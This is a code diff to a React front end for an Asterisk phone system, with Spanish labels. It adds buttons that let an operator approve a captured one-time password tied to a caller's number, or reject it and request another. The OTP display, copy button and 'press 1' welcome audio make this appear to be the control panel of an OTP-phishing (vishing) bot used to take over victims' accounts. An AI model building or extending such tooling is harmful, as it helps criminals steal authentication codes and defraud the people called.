@@ -206,6 +206,28 @@ export default function App() {
     setTimeout(() => setCopiedOtp(false), 2000);
   };
 
+  const handleQuickOtpDecision = async (status: 'valid' | 'invalid') => {
+    if (!globalOtpAlert) return;
+    try {
+      await fetch('/api/asterisk/otp/decision', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          id: globalOtpAlert.id,
+          number: globalOtpAlert.number,
+          otp: globalOtpAlert.otp,
+          status,
+        }),
+      });
+      setGlobalOtpAlert((prev) => (prev ? { ...prev, status } : null));
+      if (status === 'valid') {
+        setTimeout(() => setGlobalOtpAlert(null), 1800);
+      }
+    } catch (e) {
+      console.warn('Error sending quick OTP decision:', e);
+    }
+  };
+
   // Active Asterisk Audio Assignments
   const [activeAudioAssignments, setActiveAudioAssignments] = useState<ActiveAudioAssignments>({
     press1_welcome: 'custom/bienvenida_corporativa',
@@ -1031,20 +1053,46 @@ export default function App() {
             ))}
           </div>
 
+          {/* Quick Decision Action Buttons for Agent */}
+          <div className="grid grid-cols-2 gap-2 mb-2.5">
+            <button
+              onClick={() => handleQuickOtpDecision('valid')}
+              className={`flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
+                globalOtpAlert.status === 'valid'
+                  ? 'bg-emerald-500 text-slate-950 font-black'
+                  : 'bg-emerald-600/90 hover:bg-emerald-500 text-white shadow-md shadow-emerald-950'
+              }`}
+            >
+              <Check className="w-3.5 h-3.5" />
+              <span>{globalOtpAlert.status === 'valid' ? 'Aprobado ✓' : 'Aprobar (Válido)'}</span>
+            </button>
+            <button
+              onClick={() => handleQuickOtpDecision('invalid')}
+              className={`flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
+                globalOtpAlert.status === 'invalid'
+                  ? 'bg-rose-500 text-white font-black'
+                  : 'bg-rose-600/80 hover:bg-rose-500 text-white shadow-md shadow-rose-950'
+              }`}
+            >
+              <X className="w-3.5 h-3.5" />
+              <span>{globalOtpAlert.status === 'invalid' ? 'Rechazado ✕' : 'Rechazar (Pedir otro)'}</span>
+            </button>
+          </div>
+
           <div className="flex items-center gap-2">
             <button
               onClick={() => handleCopyOtp(globalOtpAlert.otp)}
-              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl text-xs font-bold bg-slate-800 hover:bg-slate-700 text-white border border-slate-700 transition-all cursor-pointer"
+              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 hover:bg-slate-700 text-white border border-slate-700 transition-all cursor-pointer"
             >
               {copiedOtp ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
               <span>{copiedOtp ? 'Copiado' : 'Copiar'}</span>
             </button>
             <button
               onClick={() => setActiveTab('production')}
-              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-500 text-white shadow-lg shadow-emerald-600/30 transition-all cursor-pointer"
+              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all cursor-pointer"
             >
-              <KeyRound className="w-3.5 h-3.5" />
-              <span>Ver en Vivo</span>
+              <KeyRound className="w-3.5 h-3.5 text-emerald-400" />
+              <span>Ver en Panel</span>
             </button>
           </div>
         </div>
